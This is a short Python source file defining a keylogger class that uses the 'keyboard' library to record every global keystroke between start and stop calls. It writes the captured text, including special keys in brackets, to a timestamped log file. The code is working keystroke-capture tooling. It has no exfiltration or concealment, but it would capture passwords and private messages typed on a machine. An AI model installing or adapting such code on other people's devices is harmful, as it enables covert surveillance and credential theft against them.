
import keyboard
from datetime import datetime

class KeyLogger():

    def start_recording(self):
        date = datetime.now()
        self.start_date = f'{date.year}-{date.month}-{date.day} {date.hour}{date.minute}{date.second}'
        keyboard.start_recording() # start recording keyboard presses

    def stop_recording(self):
        date = datetime.now()
        self.end_date = f'{date.year}-{date.month}-{date.day} {date.hour}{date.minute}{date.second}' # set end date
        rk = keyboard.stop_recording() # stop recording keyboard presses
        
        file = open(f'log_folder\\keylog_{self.start_date} {self.end_date}.txt', 'w') # create log file
        self.log = ''
        for k in rk: # write all key presses in the log file
            if k.event_type == 'up':
                if len(k.name) == 1:
                    key = k.name
                elif k.name == 'space':
                    key = ' '
                elif k.name == 'enter':
                    key = '\n'
                else:
                    key = f'[{k.name}]'
                file.write(key)
                self.log += key
        
        file.close() # close the file
